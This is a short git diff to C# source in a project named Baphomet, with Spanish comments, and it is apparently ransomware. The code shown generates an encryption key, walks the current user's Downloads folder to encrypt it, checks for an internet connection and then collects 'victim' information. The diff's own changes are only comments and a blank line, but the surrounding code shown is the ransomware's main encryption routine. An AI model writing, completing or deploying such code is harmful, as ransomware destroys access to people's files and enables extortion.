@@ -28,6 +28,7 @@ namespace Baphomet
             var key = cryptep.GenerateKey();
             var userName = Environment.UserName;
 
+
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
             var Dirs = new[] { "\\Downloads" };
             var  userDir = "C:\\Users\\" +userName;
@@ -37,11 +38,11 @@ namespace Baphomet
                 var targetPath = userDir + Dirs[d];
                 cryptep.directoryRoad(targetPath, key);
             }
-
+            //Verifico si tengo conecxion a internet.
             var internetCheck = netInfo.CheckInternetConnection();
             if(internetCheck != false)
             {
-                //Obtengo la data de la victima una vez cifre todos los directorios
+                //Obtengo la data de la victima una vez cifre todos los directorios.
                 var victimInfo = netInfo.GetVictimInfo();
             }
 
